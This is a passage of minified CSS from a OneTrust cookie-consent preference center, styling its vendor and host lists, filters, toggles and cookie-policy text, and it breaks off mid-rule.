.ot-host-name+a{margin-top:5px}#onetrust-pc-sdk .ot-host-name,#onetrust-pc-sdk .ot-host-name a,#onetrust-pc-sdk .ot-host-desc,#onetrust-pc-sdk .ot-host-info{color:dimgray;word-break:break-word;word-wrap:break-word}#onetrust-pc-sdk .ot-host-name,#onetrust-pc-sdk .ot-host-name a{font-weight:bold;font-size:.82em;line-height:1.3}#onetrust-pc-sdk .ot-host-name a{font-size:1em}#onetrust-pc-sdk .ot-host-expand{margin-top:3px;margin-bottom:3px;clear:both;display:block;color:#3860be;font-size:.72em;font-weight:normal}#onetrust-pc-sdk .ot-host-expand *{font-size:inherit}#onetrust-pc-sdk .ot-host-desc,#onetrust-pc-sdk .ot-host-info{font-size:.688em;line-height:1.4;font-weight:normal}#onetrust-pc-sdk .ot-host-desc{margin-top:10px}#onetrust-pc-sdk .ot-host-opt{margin:0;font-size:inherit;display:inline-block;width:100%}#onetrust-pc-sdk .ot-host-opt li>div div{font-size:.8em;padding:5px 0}#onetrust-pc-sdk .ot-host-opt li>div div:nth-child(1){width:30%;float:left}#onetrust-pc-sdk .ot-host-opt li>div div:nth-child(2){width:70%;float:left;word-break:break-word;word-wrap:break-word}#onetrust-pc-sdk .ot-host-info{border:none;display:inline-block;width:calc(100% - 10px);padding:10px;margin-bottom:10px;background-color:#f8f8f8}#onetrust-pc-sdk .ot-host-info>div{overflow:auto}#onetrust-pc-sdk #no-results{text-align:center;margin-top:30px}#onetrust-pc-sdk #no-results p{font-size:1em;color:#2e3644;word-break:break-word;word-wrap:break-word}#onetrust-pc-sdk #no-results p span{font-weight:bold}#onetrust-pc-sdk #ot-fltr-modal{width:100%;height:auto;display:none;-moz-transition:.2s ease;-o-transition:.2s ease;-webkit-transition:2s ease;transition:.2s ease;overflow:hidden;opacity:1;right:0}#onetrust-pc-sdk #ot-fltr-modal .ot-label-txt{display:inline-block;font-size:.85em;color:dimgray}#onetrust-pc-sdk #ot-fltr-cnt{z-index:2147483646;background-color:#fff;position:absolute;height:90%;max-height:300px;width:325px;left:210px;margin-top:10px;margin-bottom:20px;padding-right:10px;border-radius:3px;-webkit-box-shadow:0px 0px 12px 2px #c7c5c7;-moz-box-shadow:0px 0px 12px 2px #c7c5c7;box-shadow:0px 0px 12px 2px #c7c5c7}#onetrust-pc-sdk .ot-fltr-scrlcnt{overflow-y:auto;overflow-x:hidden;clear:both;max-height:calc(100% - 60px)}#onetrust-pc-sdk #ot-anchor{border:12px solid transparent;display:none;position:absolute;z-index:2147483647;right:55px;top:75px;transform:rotate(45deg);-o-transform:rotate(45deg);-ms-transform:rotate(45deg);-webkit-transform:rotate(45deg);background-color:#fff;-webkit-box-shadow:-3px -3px 5px -2px #c7c5c7;-moz-box-shadow:-3px -3px 5px -2px #c7c5c7;box-shadow:-3px -3px 5px -2px #c7c5c7}#onetrust-pc-sdk .ot-fltr-btns{margin-left:15px}#onetrust-pc-sdk #filter-apply-handler{margin-right:15px}#onetrust-pc-sdk .ot-fltr-opt{margin-bottom:25px;margin-left:15px;width:75%;position:relative}#onetrust-pc-sdk .ot-fltr-opt p{display:inline-block;margin:0;font-size:.9em;color:#2e3644}#onetrust-pc-sdk .ot-chkbox label span{font-size:.85em;color:dimgray}#onetrust-pc-sdk .ot-chkbox input[type=checkbox]+label::after{content:none;color:#fff}#onetrust-pc-sdk .ot-chkbox input[type=checkbox]:checked+label::after{content:""}#onetrust-pc-sdk .ot-chkbox input[type=checkbox]:focus+label::before{outline-style:solid;outline-width:2px;outline-style:auto}#onetrust-pc-sdk #ot-selall-vencntr,#onetrust-pc-sdk #ot-selall-adtlvencntr,#onetrust-pc-sdk #ot-selall-hostcntr,#onetrust-pc-sdk #ot-selall-licntr,#onetrust-pc-sdk #ot-selall-gnvencntr{right:15px;position:relative;width:20px;height:20px;float:right}#onetrust-pc-sdk #ot-selall-vencntr label,#onetrust-pc-sdk #ot-selall-adtlvencntr label,#onetrust-pc-sdk #ot-selall-hostcntr label,#onetrust-pc-sdk #ot-selall-licntr label,#onetrust-pc-sdk #ot-selall-gnvencntr label{float:left;padding-left:0}#onetrust-pc-sdk #ot-ven-lst:first-child{border-top:1px solid #e2e2e2}#onetrust-pc-sdk ul{list-style:none;padding:0}#onetrust-pc-sdk ul li{position:relative;margin:0;padding:15px 15px 15px 10px;border-bottom:1px solid #e2e2e2}#onetrust-pc-sdk ul li h3{font-size:.75em;color:#656565;margin:0;display:inline-block;width:70%;height:auto;word-break:break-word;word-wrap:break-word}#onetrust-pc-sdk ul li p{margin:0;font-size:.7em}#onetrust-pc-sdk ul li input[type=checkbox]{position:absolute;cursor:pointer;width:100%;height:100%;opacity:0;margin:0;top:0;left:0}#onetrust-pc-sdk .ot-cat-item>button:focus,#onetrust-pc-sdk .ot-acc-cntr>button:focus,#onetrust-pc-sdk li>button:focus{outline:#000 solid 2px}#onetrust-pc-sdk .ot-cat-item>button,#onetrust-pc-sdk .ot-acc-cntr>button,#onetrust-pc-sdk li>button{position:absolute;cursor:pointer;width:100%;height:100%;margin:0;top:0;left:0;z-index:1;max-width:none;border:none}#onetrust-pc-sdk .ot-cat-item>button[aria-expanded=false]~.ot-acc-txt,#onetrust-pc-sdk .ot-acc-cntr>button[aria-expanded=false]~.ot-acc-txt,#onetrust-pc-sdk li>button[aria-expanded=false]~.ot-acc-txt{margin-top:0;max-height:0;opacity:0;overflow:hidden;width:100%;transition:.25s ease-out;display:none}#onetrust-pc-sdk .ot-cat-item>button[aria-expanded=true]~.ot-acc-txt,#onetrust-pc-sdk .ot-acc-cntr>button[aria-expanded=true]~.ot-acc-txt,#onetrust-pc-sdk li>button[aria-expanded=true]~.ot-acc-txt{transition:.1s ease-in;margin-top:10px;width:100%;overflow:auto;display:block}#onetrust-pc-sdk .ot-cat-item>button[aria-expanded=true]~.ot-acc-grpcntr,#onetrust-pc-sdk .ot-acc-cntr>button[aria-expanded=true]~.ot-acc-grpcntr,#onetrust-pc-sdk li>button[aria-expanded=true]~.ot-acc-grpcntr{width:auto;margin-top:0px;padding-bottom:10px}#onetrust-pc-sdk .ot-host-item>button:focus,#onetrust-pc-sdk .ot-ven-item>button:focus{outline:0;border:2px solid #000}#onetrust-pc-sdk .ot-hide-acc>button{pointer-events:none}#onetrust-pc-sdk .ot-hide-acc .ot-plus-minus>*,#onetrust-pc-sdk .ot-hide-acc .ot-arw-cntr>*{visibility:hidden}#onetrust-pc-sdk .ot-hide-acc .ot-acc-hdr{min-height:30px}#onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt){padding-right:10px;width:calc(100% - 37px);margin-top:10px;max-height:calc(100% - 90px)}#onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) #ot-sel-blk{background-color:#f9f9fc;border:1px solid #e2e2e2;width:calc(100% - 2px);padding-bottom:5px;padding-top:5px}#onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-sel-all{padding-right:34px}#onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-sel-all-chkbox{width:auto}#onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) ul li{border:1px solid #e2e2e2;margin-bottom:10px}#onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-acc-cntr>.ot-acc-hdr{padding:10px 0 10px 15px}#onetrust-pc-sdk.ot-addtl-vendors .ot-sel-all-chkbox{float:right}#onetrust-pc-sdk.ot-addtl-vendors .ot-plus-minus~.ot-sel-all-chkbox{right:34px}#onetrust-pc-sdk.ot-addtl-vendors #ot-ven-lst:first-child{border-top:none}#onetrust-pc-sdk .ot-acc-cntr{position:relative;border-left:1px solid #e2e2e2;border-right:1px solid #e2e2e2;border-bottom:1px solid #e2e2e2}#onetrust-pc-sdk .ot-acc-cntr input{z-index:1}#onetrust-pc-sdk .ot-acc-cntr>.ot-acc-hdr{background-color:#f9f9fc;padding:5px 0 5px 15px;width:auto}#onetrust-pc-sdk .ot-acc-cntr>.ot-acc-hdr .ot-plus-minus{vertical-align:middle;top:auto}#onetrust-pc-sdk .ot-acc-cntr>.ot-acc-hdr .ot-arw-cntr{right:10px}#onetrust-pc-sdk .ot-acc-cntr>.ot-acc-hdr input{z-index:2}#onetrust-pc-sdk .ot-acc-cntr>input[type=checkbox]:checked~.ot-acc-hdr{border-bottom:1px solid #e2e2e2}#onetrust-pc-sdk .ot-acc-cntr>.ot-acc-txt{padding-left:10px;padding-right:10px}#onetrust-pc-sdk .ot-acc-cntr button[aria-expanded=true]~.ot-acc-txt{width:auto}#onetrust-pc-sdk .ot-acc-cntr .ot-addtl-venbox{display:none}#onetrust-pc-sdk .ot-vlst-cntr{margin-bottom:0;width:100%}#onetrust-pc-sdk .ot-vensec-title{font-size:.813em;vertical-align:middle;display:inline-block}#onetrust-pc-sdk .category-vendors-list-handler,#onetrust-pc-sdk .category-vendors-list-handler+a{margin-left:0;margin-top:10px}#onetrust-pc-sdk #ot-selall-vencntr.line-through label::after,#onetrust-pc-sdk #ot-selall-adtlvencntr.line-through label::after,#onetrust-pc-sdk #ot-selall-licntr.line-through label::after,#onetrust-pc-sdk #ot-selall-hostcntr.line-through label::after,#onetrust-pc-sdk #ot-selall-gnvencntr.line-through label::after{height:auto;border-left:0;transform:none;-o-transform:none;-ms-transform:none;-webkit-transform:none;left:5px;top:9px}#onetrust-pc-sdk #ot-category-title{float:left;padding-bottom:10px;font-size:1em;width:100%}#onetrust-pc-sdk .ot-cat-grp{margin-top:10px}#onetrust-pc-sdk .ot-cat-item{line-height:1.1;margin-top:10px;display:inline-block;width:100%}#onetrust-pc-sdk .ot-btn-container{text-align:right}#onetrust-pc-sdk .ot-btn-container button{display:inline-block;font-size:.75em;letter-spacing:.08em;margin-top:19px}#onetrust-pc-sdk #close-pc-btn-handler.ot-close-icon{position:absolute;top:10px;right:0;z-index:1;padding:0;background-color:transparent;border:none}#onetrust-pc-sdk #close-pc-btn-handler.ot-close-icon:hover{opacity:.7}#onetrust-pc-sdk #close-pc-btn-handler.ot-close-icon svg{display:block;height:10px;width:10px}#onetrust-pc-sdk #clear-filters-handler{margin-top:20px;margin-bottom:10px;float:right;max-width:200px;text-decoration:none;color:#3860be;font-size:.9em;font-weight:bold;background-color:transparent;border-color:transparent;padding:1px}#onetrust-pc-sdk #clear-filters-handler:hover{color:#2285f7}#onetrust-pc-sdk #clear-filters-handler:focus{outline:#000 solid 1px}#onetrust-pc-sdk .ot-accordion-layout.ot-cat-item{position:relative;border-radius:2px;margin:0;padding:0;border:1px solid #d8d8d8;border-top:none;width:calc(100% - 2px);float:left}#onetrust-pc-sdk .ot-accordion-layout.ot-cat-item:first-of-type{margin-top:10px;border-top:1px solid #d8d8d8}#onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpdesc{padding-left:20px;padding-right:20px;width:calc(100% - 40px);font-size:.812em;margin-bottom:10px;margin-top:15px}#onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpdesc>ul{padding-top:10px}#onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpdesc>ul li{padding-top:0;line-height:1.5;padding-bottom:10px}#onetrust-pc-sdk .ot-accordion-layout div+.ot-acc-grpdesc{margin-top:5px}#onetrust-pc-sdk .ot-accordion-layout .ot-vlst-cntr:first-child{margin-top:10px}#onetrust-pc-sdk .ot-accordion-layout .ot-vlst-cntr:last-child,#onetrust-pc-sdk .ot-accordion-layout .ot-hlst-cntr:last-child{margin-bottom:5px}#onetrust-pc-sdk .ot-accordion-layout .ot-acc-hdr{padding-top:11.5px;padding-bottom:11.5px;padding-left:20px;padding-right:20px;width:calc(100% - 40px);display:inline-block}#onetrust-pc-sdk .ot-accordion-layout .ot-acc-txt{width:100%;padding:0px}#onetrust-pc-sdk .ot-accordion-layout .ot-subgrp-cntr{padding-left:20px;padding-right:15px;padding-bottom:0;width:calc(100% - 35px)}#onetrust-pc-sdk .ot-accordion-layout .ot-subgrp{padding-right:5px}#onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpcntr{z-index:1;position:relative}#onetrust-pc-sdk .ot-accordion-layout .ot-cat-header+.ot-arw-cntr{position:absolute;top:50%;transform:translateY(-50%);right:20px;margin-top:-2px}#onetrust-pc-sdk .ot-accordion-layout .ot-cat-header+.ot-arw-cntr .ot-arw{width:15px;height:20px;margin-left:5px;color:dimgray}#onetrust-pc-sdk .ot-accordion-layout .ot-cat-header{float:none;color:#2e3644;margin:0;display:inline-block;height:auto;word-wrap:break-word;min-height:inherit}#onetrust-pc-sdk .ot-accordion-layout .ot-vlst-cntr,#onetrust-pc-sdk .ot-accordion-layout .ot-hlst-cntr{padding-left:20px;width:calc(100% - 20px);display:inline-block;margin-top:0px;padding-bottom:2px}#onetrust-pc-sdk .ot-accordion-layout .ot-acc-hdr{position:relative;min-height:25px}#onetrust-pc-sdk .ot-accordion-layout h4~.ot-tgl,#onetrust-pc-sdk .ot-accordion-layout h4~.ot-always-active{position:absolute;top:50%;transform:translateY(-50%);right:20px}#onetrust-pc-sdk .ot-accordion-layout h4~.ot-tgl+.ot-tgl{right:95px}#onetrust-pc-sdk .ot-accordion-layout .category-vendors-list-handler,#onetrust-pc-sdk .ot-accordion-layout .category-vendors-list-handler+a{margin-top:5px}#onetrust-pc-sdk .ot-enbl-chr h4~.ot-tgl,#onetrust-pc-sdk .ot-enbl-chr h4~.ot-always-active{right:45px}#onetrust-pc-sdk .ot-enbl-chr h4~.ot-tgl+.ot-tgl{right:120px}#onetrust-pc-sdk .ot-enbl-chr .ot-pli-hdr.ot-leg-border-color span:first-child{width:90px}#onetrust-pc-sdk .ot-enbl-chr li.ot-subgrp>h5+.ot-tgl-cntr{padding-right:25px}#onetrust-pc-sdk .ot-plus-minus{width:20px;height:20px;font-size:1.5em;position:relative;display:inline-block;margin-right:5px;top:3px}#onetrust-pc-sdk .ot-plus-minus span{position:absolute;background:#27455c;border-radius:1px}#onetrust-pc-sdk .ot-plus-minus span:first-of-type{top:25%;bottom:25%;width:10%;left:45%}#onetrust-pc-sdk .ot-plus-minus span:last-of-type{left:25%;right:25%;height:10%;top:45%}#onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-arw,#onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-plus-minus span:first-of-type,#onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-plus-minus span:last-of-type{transform:rotate(90deg)}#onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-plus-minus span:last-of-type{left:50%;right:50%}#onetrust-pc-sdk #ot-selall-vencntr label,#onetrust-pc-sdk #ot-selall-adtlvencntr label,#onetrust-pc-sdk #ot-selall-hostcntr label,#onetrust-pc-sdk #ot-selall-licntr label{position:relative;display:inline-block;width:20px;height:20px}#onetrust-pc-sdk .ot-host-item .ot-plus-minus,#onetrust-pc-sdk .ot-ven-item .ot-plus-minus{float:left;margin-right:8px;top:10px}#onetrust-pc-sdk .ot-ven-item ul{list-style:none inside;font-size:100%;margin:0}#onetrust-pc-sdk .ot-ven-item ul li{margin:0 !important;padding:0;border:none !important}#onetrust-pc-sdk .ot-pli-hdr{color:#77808e;overflow:hidden;padding-top:7.5px;padding-bottom:7.5px;width:calc(100% - 2px);border-top-left-radius:3px;border-top-right-radius:3px}#onetrust-pc-sdk .ot-pli-hdr span:first-child{top:50%;transform:translateY(50%);max-width:90px}#onetrust-pc-sdk .ot-pli-hdr span:last-child{padding-right:10px;max-width:95px;text-align:center}#onetrust-pc-sdk .ot-li-title{float:right;font-size:.813em}#onetrust-pc-sdk .ot-pli-hdr.ot-leg-border-color{background-color:#f4f4f4;border:1px solid #d8d8d8}#onetrust-pc-sdk .ot-pli-hdr.ot-leg-border-color span:first-child{text-align:left;width:70px}#onetrust-pc-sdk li.ot-subgrp>h5,#onetrust-pc-sdk .ot-cat-header{width:calc(100% - 130px)}#onetrust-pc-sdk li.ot-subgrp>h5+.ot-tgl-cntr{padding-left:13px}#onetrust-pc-sdk .ot-acc-grpcntr .ot-acc-grpdesc{margin-bottom:5px}#onetrust-pc-sdk .ot-acc-grpcntr .ot-subgrp-cntr{border-top:1px solid #d8d8d8}#onetrust-pc-sdk .ot-acc-grpcntr .ot-vlst-cntr+.ot-subgrp-cntr{border-top:none}#onetrust-pc-sdk .ot-acc-hdr .ot-arw-cntr+.ot-tgl-cntr,#onetrust-pc-sdk .ot-acc-txt h4+.ot-tgl-cntr{padding-left:13px}#onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item .ot-subgrp>h5,#onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item .ot-cat-header{width:calc(100% - 145px)}#onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item h5+.ot-tgl-cntr,#onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item .ot-cat-header+.ot-tgl{padding-left:28px}#onetrust-pc-sdk .ot-sel-all-hdr,#onetrust-pc-sdk .ot-sel-all-chkbox{display:inline-block;width:100%;position:relative}#onetrust-pc-sdk .ot-sel-all-chkbox{z-index:1}#onetrust-pc-sdk .ot-sel-all{margin:0;position:relative;padding-right:23px;float:right}#onetrust-pc-sdk .ot-consent-hdr,#onetrust-pc-sdk .ot-li-hdr{float:right;font-size:.812em;line-height:normal;text-align:center;word-break:break-word;word-wrap:break-word}#onetrust-pc-sdk .ot-li-hdr{max-width:100px;padding-right:10px}#onetrust-pc-sdk .ot-consent-hdr{max-width:55px}#onetrust-pc-sdk #ot-selall-licntr{display:block;width:21px;height:auto;float:right;position:relative;right:80px}#onetrust-pc-sdk #ot-selall-licntr label{position:absolute}#onetrust-pc-sdk .ot-ven-ctgl{margin-left:66px}#onetrust-pc-sdk .ot-ven-litgl+.ot-arw-cntr{margin-left:81px}#onetrust-pc-sdk .ot-enbl-chr .ot-host-cnt .ot-tgl-cntr{width:auto}#onetrust-pc-sdk #ot-lst-cnt:not(.ot-host-cnt) .ot-tgl-cntr{width:auto;top:auto;height:20px}#onetrust-pc-sdk #ot-lst-cnt .ot-chkbox{position:relative;display:inline-block;width:20px;height:20px}#onetrust-pc-sdk #ot-lst-cnt .ot-chkbox label{position:absolute;padding:0;width:20px;height:20px}#onetrust-pc-sdk .ot-acc-grpdesc+.ot-leg-btn-container{padding-left:20px;padding-right:20px;width:calc(100% - 40px);margin-bottom:5px}#onetrust-pc-sdk .ot-subgrp .ot-leg-btn-container{margin-bottom:5px}#onetrust-pc-sdk #ot-ven-lst .ot-leg-btn-container{margin-top:10px}#onetrust-pc-sdk .ot-leg-btn-container{display:inline-block;width:100%;margin-bottom:10px}#onetrust-pc-sdk .ot-leg-btn-container button{height:auto;padding:6.5px 8px;margin-bottom:0;letter-spacing:0;font-size:.75em;line-height:normal}#onetrust-pc-sdk .ot-leg-btn-container svg{display:none;height:14px;width:14px;padding-right:5px;vertical-align:sub}#onetrust-pc-sdk .ot-active-leg-btn{cursor:default;pointer-events:none}#onetrust-pc-sdk .ot-active-leg-btn svg{display:inline-block}#onetrust-pc-sdk .ot-remove-objection-handler{text-decoration:underline;padding:0;font-size:.75em;font-weight:600;line-height:1;padding-left:10px}#onetrust-pc-sdk .ot-obj-leg-btn-handler span{font-weight:bold;text-align:center;font-size:inherit;line-height:1.5}#onetrust-pc-sdk.ot-close-btn-link #close-pc-btn-handler{border:none;height:auto;line-height:1.5;text-decoration:underline;font-size:.69em;background:none;right:15px;top:15px;width:auto;font-weight:normal}#onetrust-pc-sdk[dir=rtl] #ot-back-arw,#onetrust-pc-sdk[dir=rtl] input~.ot-acc-hdr .ot-arw{transform:rotate(180deg);-o-transform:rotate(180deg);-ms-transform:rotate(180deg);-webkit-transform:rotate(180deg)}#onetrust-pc-sdk[dir=rtl] input:checked~.ot-acc-hdr .ot-arw{transform:rotate(270deg);-o-transform:rotate(270deg);-ms-transform:rotate(270deg);-webkit-transform:rotate(270deg)}#onetrust-pc-sdk[dir=rtl] .ot-chkbox label::after{transform:rotate(45deg);-webkit-transform:rotate(45deg);-o-transform:rotate(45deg);-ms-transform:rotate(45deg);border-left:0;border-right:3px solid}#onetrust-pc-sdk[dir=rtl] .ot-search-cntr>svg{right:0}@media only screen and (max-width: 600px){#onetrust-pc-sdk.otPcCenter{left:0;min-width:100%;height:100%;top:0;border-radius:0}#onetrust-pc-sdk #ot-pc-content,#onetrust-pc-sdk.ot-ftr-stacked .ot-btn-container{margin:1px 3px 0 10px;padding-right:10px;width:calc(100% - 23px)}#onetrust-pc-sdk .ot-btn-container button{max-width:none;letter-spacing:.01em}#onetrust-pc-sdk #close-pc-btn-handler{top:10px;right:17px}#onetrust-pc-sdk p{font-size:.7em}#onetrust-pc-sdk #ot-pc-hdr{margin:10px 10px 0 5px;width:calc(100% - 15px)}#onetrust-pc-sdk .vendor-search-handler{font-size:1em}#onetrust-pc-sdk #ot-back-arw{margin-left:12px}#onetrust-pc-sdk #ot-lst-cnt{margin:0;padding:0 5px 0 10px;min-width:95%}#onetrust-pc-sdk .switch+p{max-width:80%}#onetrust-pc-sdk .ot-ftr-stacked button{width:100%}#onetrust-pc-sdk #ot-fltr-cnt{max-width:320px;width:90%;border-top-right-radius:0;border-bottom-right-radius:0;margin:0;margin-left:15px;left:auto;right:40px;top:85px}#onetrust-pc-sdk .ot-fltr-opt{margin-left:25px;margin-bottom:10px}#onetrust-pc-sdk .ot-pc-refuse-all-handler{margin-bottom:0}#onetrust-pc-sdk #ot-fltr-cnt{right:40px}}@media only screen and (max-width: 476px){#onetrust-pc-sdk .ot-fltr-cntr,#onetrust-pc-sdk #ot-fltr-cnt{right:10px}#onetrust-pc-sdk #ot-anchor{right:25px}#onetrust-pc-sdk button{width:100%}#onetrust-pc-sdk:not(.ot-addtl-vendors) #ot-pc-lst:not(.ot-enbl-chr) .ot-sel-all{padding-right:9px}#onetrust-pc-sdk:not(.ot-addtl-vendors) #ot-pc-lst:not(.ot-enbl-chr) .ot-tgl-cntr{right:0}}@media only screen and (max-width: 896px)and (max-height: 425px)and (orientation: landscape){#onetrust-pc-sdk.otPcCenter{left:0;top:0;min-width:100%;height:100%;border-radius:0}#onetrust-pc-sdk #ot-anchor{left:initial;right:50px}#onetrust-pc-sdk #ot-lst-title{margin-top:12px}#onetrust-pc-sdk #ot-lst-title *{font-size:inherit}#onetrust-pc-sdk #ot-pc-hdr input{margin-right:0;padding-right:45px}#onetrust-pc-sdk .switch+p{max-width:85%}#onetrust-pc-sdk #ot-sel-blk{position:static}#onetrust-pc-sdk #ot-pc-lst{overflow:auto}#onetrust-pc-sdk #ot-lst-cnt{max-height:none;overflow:initial}#onetrust-pc-sdk #ot-lst-cnt.no-results{height:auto}#onetrust-pc-sdk input{font-size:1em !important}#onetrust-pc-sdk p{font-size:.6em}#onetrust-pc-sdk #ot-fltr-modal{width:100%;top:0}#onetrust-pc-sdk ul li p,#onetrust-pc-sdk .category-vendors-list-handler,#onetrust-pc-sdk .category-vendors-list-handler+a,#onetrust-pc-sdk .category-host-list-handler{font-size:.6em}#onetrust-pc-sdk.ot-shw-fltr #ot-anchor{display:none !important}#onetrust-pc-sdk.ot-shw-fltr #ot-pc-lst{height:100% !important;overflow:hidden;top:0px}#onetrust-pc-sdk.ot-shw-fltr #ot-fltr-cnt{margin:0;height:100%;max-height:none;padding:10px;top:0;width:calc(100% - 20px);position:absolute;right:0;left:0;max-width:none}#onetrust-pc-sdk.ot-shw-fltr .ot-fltr-scrlcnt{max-height:calc(100% - 65px)}}
            #onetrust-consent-sdk #onetrust-pc-sdk,
                #onetrust-consent-sdk #ot-search-cntr,
                #onetrust-consent-sdk #onetrust-pc-sdk .ot-switch.ot-toggle,
                #onetrust-consent-sdk #onetrust-pc-sdk ot-grp-hdr1 .checkbox,
                #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-title:after
                ,#onetrust-consent-sdk #onetrust-pc-sdk #ot-sel-blk,
                        #onetrust-consent-sdk #onetrust-pc-sdk #ot-fltr-cnt,
                        #onetrust-consent-sdk #onetrust-pc-sdk #ot-anchor {
                    background-color: #FFFFFF;
                }
               
            #onetrust-consent-sdk #onetrust-pc-sdk h3,
                #onetrust-consent-sdk #onetrust-pc-sdk h4,
                #onetrust-consent-sdk #onetrust-pc-sdk h5,
                #onetrust-consent-sdk #onetrust-pc-sdk h6,
                #onetrust-consent-sdk #onetrust-pc-sdk p,
                #onetrust-consent-sdk #onetrust-pc-sdk #ot-ven-lst .ot-ven-opts p,
                #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-desc,
                #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-title,
                #onetrust-consent-sdk #onetrust-pc-sdk .ot-li-title,
                #onetrust-consent-sdk #onetrust-pc-sdk .ot-sel-all-hdr span,
                #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info,
                #onetrust-consent-sdk #onetrust-pc-sdk #ot-fltr-modal #modal-header,
                #onetrust-consent-sdk #onetrust-pc-sdk .ot-checkbox label span,
                #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-sel-blk p,
                #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-lst-title h3,
                #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst .back-btn-handler p,
                #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst .ot-ven-name,
                #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-ven-lst .consent-category,
                #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-inactive-leg-btn,
                #onetrust-consent-sdk #onetrust-pc-sdk .ot-label-status,
                #onetrust-consent-sdk #onetrust-pc-sdk .ot-chkbox label span,
                #onetrust-consent-sdk #onetrust-pc-sdk #clear-filters-handler 
                {
                    color: #696969;
                }
             #onetrust-consent-sdk #onetrust-pc-sdk .privacy-notice-link,
                    #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler,
                    #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler + a,
                    #onetrust-consent-sdk #onetrust-pc-sdk .category-host-list-handler,
                    #onetrust-consent-sdk #onetrust-pc-sdk .ot-ven-link,
                    #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-name a,
                    #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-acc-hdr .ot-host-expand,
                    #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info a
                    {
                        color: #3860BE;
                    }
            #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler:hover { opacity: .7;}
            #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-grpcntr.ot-acc-txt,
            #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-txt .ot-subgrp-tgl .ot-switch.ot-toggle
             {
                background-color: #E9E9E9;
            }
             #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info,
                    #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-txt .ot-ven-dets
                            {
                                background-color: #E9E9E9;
                            }
        #onetrust-consent-sdk #onetrust-pc-sdk 
            button:not(#clear-filters-handler):not(.ot-close-icon):not(#filter-btn-handler):not(.ot-remove-objection-handler):not(.ot-obj-leg-btn-handler):not([aria-expanded]):not(.ot-link-btn),
            #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-active-leg-btn {
                background-color: #1371C3;border-color: #1371C3;
                color: #FFFFFF;
            }
            #onetrust-consent-sdk #onetrust-pc-sdk .ot-active-menu {
                border-color: #1371C3;
            }
            
            #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-remove-objection-handler{
                background-color: transparent;
                border: 1px solid transparent;
            }
            #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-inactive-leg-btn {
                background-color: #FFFFFF;
                color: #78808E; border-color: #78808E;
            }
            
            #onetrust-consent-sdk #onetrust-pc-sdk .ot-tgl input:focus + .ot-switch, .ot-switch .ot-switch-nob, .ot-switch .ot-switch-nob:before,
            #onetrust-pc-sdk .ot-checkbox input[type="checkbox"]:focus + label::before,
            #onetrust-pc-sdk .ot-chkbox input[type="checkbox"]:focus + label::before {
                outline-color: #000000;
                outline-width: 1px;
            }
            #onetrust-pc-sdk .ot-host-item > button:focus, #onetrust-pc-sdk .ot-ven-item > button:focus {
                border: 1px solid #000000;
            }
            #onetrust-consent-sdk #onetrust-pc-sdk *:focus,
            #onetrust-consent-sdk #onetrust-pc-sdk .ot-vlst-cntr > a:focus {
               outline: 1px solid #000000;
            }.ot-sdk-cookie-policy{font-family:inherit;font-size:16px}.ot-sdk-cookie-policy.otRelFont{font-size:1rem}.ot-sdk-cookie-policy h3,.ot-sdk-cookie-policy h4,.ot-sdk-cookie-policy h6,.ot-sdk-cookie-policy p,.ot-sdk-cookie-policy li,.ot-sdk-cookie-policy a,.ot-sdk-cookie-policy th,.ot-sdk-cookie-policy #cookie-policy-description,.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group,.ot-sdk-cookie-policy #cookie-policy-title{color:dimgray}.ot-sdk-cookie-policy #cookie-policy-description{margin-bottom:1em}.ot-sdk-cookie-policy h4{font-size:1.2em}.ot-sdk-cookie-policy h6{font-size:1em;margin-top:2em}.ot-sdk-cookie-policy th{min-width:75px}.ot-sdk-cookie-policy a,.ot-sdk-cookie-policy a:hover{background:#fff}.ot-sdk-cookie-policy thead{background-color:#f6f6f4;font-weight:bold}.ot-sdk-cookie-policy .ot-mobile-border{display:none}.ot-sdk-cookie-policy section{margin-bottom:2em}.ot-sdk-cookie-policy 